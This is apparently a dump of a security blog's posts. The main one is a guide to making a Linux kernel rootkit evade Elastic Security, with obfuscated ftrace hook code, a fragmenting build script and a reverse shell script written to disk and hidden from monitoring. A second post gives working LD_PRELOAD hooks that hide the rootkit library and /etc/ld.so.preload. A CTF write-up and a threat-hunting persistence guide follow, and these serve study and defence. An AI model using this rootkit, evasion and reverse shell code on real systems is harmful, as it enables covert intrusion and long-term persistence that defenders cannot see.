net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Challenge Description In this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service 